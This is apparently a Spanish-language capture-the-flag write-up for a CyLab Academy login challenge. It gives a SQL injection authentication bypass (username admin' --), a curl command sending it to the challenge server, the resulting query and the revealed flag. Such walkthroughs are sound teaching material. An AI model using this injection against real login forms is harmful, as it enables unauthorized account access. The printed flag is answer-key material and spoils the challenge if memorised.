## Descripción
Can you login to this website?

[http://xebec.cylabacademy.net:18438/](http://xebec.cylabacademy.net:18438/)

1.- `admin` is the user you want to login as.
## Solución
```
El formulario manda los datos a login.php usando los campos username, password y debug.

Usé una inyección SQL en el usuario:

username: admin' --
password: test

También se puede enviar con curl:

curl -s -X POST http://xebec.cylabacademy.net:18438/login.php -d "username=admin' --&password=test&debug=1"

La consulta quedó así:

SELECT * FROM users WHERE name='admin' --' AND password='test'

El comentario -- hizo que se ignorara la validación de la contraseña.

La página respondió con login exitoso y la bandera oculta en el HTML:

<p hidden>Your flag is: academy{L00k5_l1k3_y0u_solv3d_it_b57ed0cd}</p>

academy{L00k5_l1k3_y0u_solv3d_it_b57ed0cd}
```
```

```

## Notas Adicionales
- La comilla simple cerró el valor del usuario dentro de la consulta SQL.
- `--` inició un comentario en SQL y anuló la parte que revisaba la contraseña.
- La bandera estaba en un elemento HTML oculto, por eso era necesario revisar el código fuente.
## Referencias
- [http://xebec.cylabacademy.net:18438/](http://xebec.cylabacademy.net:18438/)
- [http://xebec.cylabacademy.net:18438/login.php](http://xebec.cylabacademy.net:18438/login.php)
